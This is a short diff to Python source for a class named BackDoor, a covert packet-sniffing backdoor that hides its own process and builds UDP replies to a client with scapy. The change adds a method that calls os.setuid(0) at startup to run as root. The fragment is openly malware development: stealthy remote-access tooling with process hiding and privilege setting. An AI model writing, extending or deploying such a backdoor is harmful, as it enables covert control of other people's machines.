@@ -22,10 +22,15 @@ class BackDoor:
 
     def start(self):
         self.hide_process()
+        self.set_uid()
         print("Starting.....")
         print("Listening for packets")
         print("--------------------------------------------------------------")
         self.sniff_init()
+
+    def set_uid(self):
+        os.setuid(0)
+
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
         udp = UDP(sport=RandShort(), dport=self.client_port)
